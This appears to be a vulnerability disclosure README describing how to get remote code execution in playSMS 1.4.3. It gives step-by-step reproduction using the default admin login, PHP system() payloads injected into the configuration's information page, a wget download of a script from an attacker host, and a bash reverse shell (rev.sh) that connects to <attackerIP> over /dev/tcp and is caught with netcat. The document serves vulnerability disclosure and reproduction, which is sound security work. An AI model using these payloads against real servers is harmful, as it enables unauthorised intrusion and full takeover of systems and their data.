# CVE-playsms


There is a vulnerability in playsms 1.4.3 that allows potential attackers to execute remote code execution.


## how to reproduce RCE (shell):

https://playsms.org/
* docker pull playsms/playsms:1.4.3
* docker run -d -p 80:80 playsms/playsms
* login using admin:admin
* http://127.0.0.1/index.php?app=main&inc=core_main_config&op=main_config#tabs-information-page
* host malicious bash file on attacker machine
* download the malicious file using wget on the machine
* enter `<?php system("/usr/bin/wget http://<attackerIP>/rev.sh"); echo "done" ?>`
* save the information (it will disappear from the input box but still work)
* http://127.0.0.1/index.php?app=main&inc=core_welcome
* reload the page http://127.0.0.1/index.php?app=main&inc=core_main_config&op=main_config#tabs-information-page
* chmod + execute the shell script - `<?php system("chmod +x rev.sh && ./rev.sh") ?>`)
* save and visit * http://127.0.0.1/index.php?app=main&inc=core_welcome to get code execution
* run local netcat handler to catch remote shell


## rev.sh
```bash
#!/usr/bin/bash
bash -c "bash -i >& /dev/tcp/<attackerIP>/1234 0>&1"
```
